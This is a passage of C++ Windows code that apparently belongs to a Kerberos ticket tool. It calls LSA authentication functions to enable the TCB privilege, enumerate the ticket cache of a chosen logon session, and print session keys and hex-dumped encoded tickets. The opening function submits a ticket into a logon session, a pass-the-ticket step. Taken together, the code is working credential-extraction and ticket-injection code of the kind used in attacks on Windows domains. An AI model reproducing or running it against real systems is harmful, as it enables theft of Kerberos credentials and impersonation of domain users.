     //ZeroMemory(buffer, totalSize);
     //PKERB_SUBMIT_TKT_REQUEST req = (PKERB_SUBMIT_TKT_REQUEST)buffer;
    // PKERB_SUBMIT_TKT_REQUEST req = (PKERB_SUBMIT_TKT_REQUEST)LocalAlloc(LMEM_ZEROINIT, Ticket->EncodedTicketSize + sizeof(KERB_SUBMIT_TKT_REQUEST));
    // PrintSessionKey(Ticket->SessionKey);


     PBYTE buffer = (PBYTE)malloc(totalSize);
     if (!buffer) {
         // Handle allocation failure
         fprintf(stderr, "[-] Memory allocation failed\n");
         return FALSE;
     }
     ZeroMemory(buffer, totalSize);
     PKERB_SUBMIT_TKT_REQUEST req = (PKERB_SUBMIT_TKT_REQUEST)buffer;
     req->MessageType = KerbSubmitTicketMessage;
     req->LogonId = dluid;
     req->Flags = 0;
    // req->Key.KeyType = 0;
    // req->Key.Length = keySize;
     req->KerbCredSize = Ticket->EncodedTicketSize;
     req->KerbCredOffset = headerSize + keySize;

     //memcpy(buffer + req->KerbCredOffset, Ticket->EncodedTicket, Ticket->EncodedTicketSize);
     memcpy(buffer + req->KerbCredOffset, Ticket->EncodedTicket, Ticket->EncodedTicketSize);
     PVOID rep_buffer = nullptr;
     ULONG rep_length = 0;

    Status = LsaCallAuthenticationPackage(LogonHandle, PackageId,buffer, totalSize, &rep_buffer, &rep_length, &SubStatus);

     if (!SEC_SUCCESS(Status) || !SEC_SUCCESS(SubStatus))
     {
         ShowNTError("LsaCallAuthenticationPackage", Status);
         printf("Substatus: 0x%x\n", SubStatus);
         std::cout << "LsaCallAuthPackage call 2 failed" << std::endl;
         return FALSE;
     }


     CloseHandle(LogonHandle);
     if (CacheResponse)
     {
         LsaFreeReturnBuffer(CacheResponse);
     }
     if (CacheRequest)
     {
         LocalFree(CacheRequest);
     }


 }

BOOL 
ShowTgt(
    HANDLE LogonHandle,
    ULONG PackageId,
    LUID L
    )
{
    NTSTATUS Status;
    KERB_QUERY_TKT_CACHE_REQUEST CacheRequest;
	PKERB_RETRIEVE_TKT_RESPONSE TicketEntry = NULL;
    PKERB_EXTERNAL_TICKET Ticket;
    ULONG ResponseSize;
    NTSTATUS SubStatus;
    BOOLEAN Trusted = TRUE;
    Status = LsaConnectUntrusted(&LogonHandle);
    CacheRequest.MessageType = KerbRetrieveTicketMessage;
   // DWORD dwordValue = std::stoul("0x40234", nullptr, 16);
    //CacheRequest.LogonId.LowPart = dwordValue;
    //CacheRequest.LogonId.LowPart = 0;
    //CacheRequest.LogonId.HighPart = 0;


    CacheRequest.LogonId = L;
    EnablePrivilege(SE_TCB_NAME);
       
       Status = LsaCallAuthenticationPackage(
           LogonHandle,
           PackageId,
           &CacheRequest,
           sizeof(CacheRequest),
           (PVOID*)&TicketEntry,
           &ResponseSize,
           &SubStatus
       );

       CloseHandle(LogonHandle);
   
    if (!SEC_SUCCESS(Status) || !SEC_SUCCESS(SubStatus))
    {
        ShowNTError("LsaCallAuthenticationPackage", Status);
        printf("Substatus: 0x%x\n",SubStatus);
        return FALSE;
    }

    Ticket = &(TicketEntry->Ticket);

    printf("\nCached TGT:\n\n");

    printf("ServiceName        : "); PrintKerbName(Ticket->ServiceName);

    printf("TargetName         : "); PrintKerbName(Ticket->TargetName);

    printf("FullServiceName    : "); PrintKerbName(Ticket->ClientName);

    printf("DomainName         : %.*S\n",
        Ticket->DomainName.Length/sizeof(WCHAR),Ticket->DomainName.Buffer);

    printf("TargetDomainName   : %.*S\n",
        Ticket->TargetDomainName.Length/sizeof(WCHAR),Ticket->TargetDomainName.Buffer);

    printf("AltTargetDomainName: %.*S\n",
        Ticket->AltTargetDomainName.Length/sizeof(WCHAR),Ticket->AltTargetDomainName.Buffer);
    
    printf("TicketFlags        : (0x%x) ",Ticket->TicketFlags);
    PrintTktFlags(Ticket->TicketFlags);
   // PrintTime("KeyExpirationTime: ",Ticket->KeyExpirationTime);
    PrintSessionKey(Ticket->SessionKey);
    PrintTime("StartTime          : ",Ticket->StartTime);
    PrintTime("EndTime            : ",Ticket->EndTime);
    PrintTime("RenewUntil         : ",Ticket->RenewUntil);
    PrintTime("TimeSkew           : ",Ticket->TimeSkew);
   // PrintEType(Ticket->SessionKey.KeyType);
    printf("EncodedTicket      : (size: %lu)\n", Ticket->EncodedTicketSize);
    PrintHexDump(Ticket->EncodedTicket, Ticket->EncodedTicketSize);
    

    if (TicketEntry != NULL)
    {
        LsaFreeReturnBuffer(TicketEntry);
    }

    return TRUE;
}


BOOL ShowAll(HANDLE LogonHandle, ULONG PackageId, LUID L) {
    NTSTATUS Status;
    KERB_QUERY_TKT_CACHE_REQUEST CacheRequest;
    PKERB_QUERY_TKT_CACHE_RESPONSE CacheResponse = NULL;
    ULONG ResponseSize;
    NTSTATUS SubStatus;
    BOOLEAN Trusted = TRUE;

    CacheRequest.MessageType = KerbQueryTicketCacheMessage;
    CacheRequest.LogonId = L;
    //EnablePrivilege(SE_DEBUG_NAME);
    EnablePrivilege(SE_TCB_NAME);
    Status = LsaConnectUntrusted(&LogonHandle);
        Status = LsaCallAuthenticationPackage(
            LogonHandle,
            PackageId,
            &CacheRequest,
            sizeof(CacheRequest),
            (PVOID*)&CacheResponse,
            &ResponseSize,
            &SubStatus
        );
        if (!SEC_SUCCESS(Status) || !SEC_SUCCESS(SubStatus)) {
            ShowNTError("LsaCallAuthenticationPackage", Status);
            printf("Substatus: 0x%x\n", SubStatus);
            RevertIfImpersonated();
            return FALSE;
        }

        ULONG tcount = CacheResponse->CountOfTickets;
        printf("Ticket Count: %lu\n", tcount);

        for (ULONG i = 0; i < tcount; i++) {
            KERB_RETRIEVE_TKT_REQUEST RetrieveRequest;
            ZeroMemory(&RetrieveRequest, sizeof(RetrieveRequest));
            PKERB_RETRIEVE_TKT_RESPONSE TicketEntry = NULL;
            UNICODE_STRING TargetName;
            USHORT length = CacheResponse->Tickets[i].ServerName.Length / sizeof(WCHAR);
            PWSTR spn = CacheResponse->Tickets[i].ServerName.Buffer;

            std::wstring hardcodedSpn(spn, length);
            size_t spn_length = hardcodedSpn.length() * sizeof(WCHAR);
            std::vector<char> req_buffer(sizeof(KERB_RETRIEVE_TKT_REQUEST) + spn_length + sizeof(WCHAR));
            void* target_name = req_buffer.data() + sizeof(KERB_RETRIEVE_TKT_REQUEST);

            memcpy(target_name, hardcodedSpn.c_str(), spn_length);
            PKERB_RETRIEVE_TKT_REQUEST req = reinterpret_cast<PKERB_RETRIEVE_TKT_REQUEST>(req_buffer.data());
            req->MessageType = KerbRetrieveEncodedTicketMessage;
            req->LogonId = L;
            req->TargetName.Buffer = static_cast<wchar_t*>(target_name);
            req->TargetName.Length = (USHORT)spn_length;
            req->TargetName.MaximumLength = req->TargetName.Length + sizeof(wchar_t);


            PVOID rep_buffer = nullptr;
            ULONG rep_length = 0;
            NTSTATUS protocol_status = LsaCallAuthenticationPackage(
                LogonHandle,
                PackageId,
                req,
                static_cast<ULONG>(req_buffer.size()),
                &rep_buffer,
                &rep_length,
                &protocol_status
            );

            if (protocol_status < 0) {
                ShowNTError("LsaCallAuthenticationPackage", protocol_status);
                printf("Substatus: 0x%x\n", SubStatus);
                continue; // Skip to the next ticket on error
            }

            PKERB_RETRIEVE_TKT_RESPONSE rep = static_cast<PKERB_RETRIEVE_TKT_RESPONSE>(rep_buffer);
            if (!rep) {
                // Handle memory error
                continue;
            }

            KERB_EXTERNAL_TICKET& Ticket = rep->Ticket;
            printf("\nCached TGT:\n\n");
            printf("ServiceName        : "); PrintKerbName(Ticket.ServiceName);
            printf("TargetName         : "); PrintKerbName(Ticket.TargetName);
            printf("FullServiceName    : "); PrintKerbName(Ticket.ClientName);
            printf("DomainName         : %.*S\n",
                Ticket.DomainName.Length / sizeof(WCHAR), Ticket.DomainName.Buffer);
            printf("TargetDomainName   : %.*S\n",
                Ticket.TargetDomainName.Length / sizeof(WCHAR), Ticket.TargetDomainName.Buffer);
            printf("AltTargetDomainName: %.*S\n",
                Ticket.AltTargetDomainName.Length / sizeof(WCHAR), Ticket.AltTargetDomainName.Buffer);
            printf("TicketFlags        : (0x%x) ", Ticket.TicketFlags);
            PrintTktFlags(Ticket.TicketFlags);
            PrintSessionKey(Ticket.SessionKey);
            PrintTime("StartTime          : ", Ticket.StartTime);
            PrintTime("EndTime            : ", Ticket.EndTime);
            PrintTime("RenewUntil         : ", Ticket.RenewUntil);
            PrintTime("TimeSkew           : ", Ticket.TimeSkew);
            printf("EncodedTicket      : (size: %lu)\n", Ticket.EncodedTicketSize);
            PrintHexDump(Ticket.EncodedTicket, Ticket.EncodedTicketSize);
        }

        // Clean up response memory
        if (CacheResponse != NULL) {
            LsaFreeReturnBuffer(CacheResponse);
        }

        // Revert after all operations
      

    return TRUE;
}


VOID
InitUnicodeString(
	PUNICODE_STRING DestinationString,
    PCWSTR SourceString OPTIONAL
    )
{
    ULONG Length;

    DestinationString->Buffer = (PWSTR)SourceString;
    if (SourceString != NULL) {
        Length = wcslen( SourceString ) * sizeof( WCHAR );
        DestinationString->Length = (USHORT)Length;
        DestinationString->MaximumLength = (USHORT)(Length + sizeof(UNICODE_NULL));
        }
    else {
        DestinationString->MaximumLength = 0;
        DestinationString->Length = 0;
        }
}

VOID
ShowLastError(
    const char* szAPI,
    DWORD dwError
)
{
#define MAX_MSG_SIZE 256

    static WCHAR szMsgBuf[MAX_MSG_SIZE];
    DWORD dwRes;

    printf("Error calling function %s: %lu\n", szAPI, dwError);

    dwRes = FormatMessage(
        FORMAT_MESSAGE_FROM_SYSTEM,
        NULL,
        dwError,
        MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US),
        szMsgBuf,
        MAX_MSG_SIZE,
        NULL);
    if (0 == dwRes) {
        printf("FormatMessage failed with %d\n", GetLastError());
        ExitProcess(EXIT_FAILURE);
    }

    printf("%S", szMsgBuf);
}

VOID
ShowNTError(
    const char* szAPI,
    NTSTATUS Status
)
{
    // 
    // Convert the NTSTATUS to Winerror. Then call ShowLastError().     
    // 
    ShowLastError(szAPI, LsaNtStatusToWinError(Status));
}